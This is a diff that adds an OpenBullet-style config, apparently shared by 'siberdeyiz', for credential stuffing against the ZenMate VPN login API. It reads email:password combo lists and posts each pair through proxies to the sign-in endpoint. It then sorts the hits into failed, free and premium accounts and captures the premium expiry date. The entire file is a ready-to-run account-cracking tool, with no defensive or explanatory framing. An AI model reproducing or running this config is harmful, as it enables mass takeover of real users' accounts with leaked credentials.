@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "APİ ZENMATE",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-12T15:33:50.8040031+03:00",
+  "AdditionalInfo": "siberdeyiz.com",
+  "Author": "siberdeyiz & by M A V İ",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "3",
+      "Id": 1827707908
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 797867221
+    }
+  ],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.zenguard.biz/v2/sign_in" 
+  CONTENT "install_id=dc01a8fe-6993-1b6f-a499-636270ac765f&show_premium=true&auth_method=user&auth_id=<USER>&auth_secret=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#KEY KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Bad Request" 
+    KEY "Invalid email or password" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"account_type\":\"FREE\"" 
+  KEYCHAIN Success OR 
+    KEY "\"account_type\":\"PREMIUM\"" 
+
+#TARİH PARSE "<SOURCE>" LR "premium_expires_at\":\"" "\",\"" -> CAP "ÜYELİK" "" "----siberdeyiz.com----" 
+
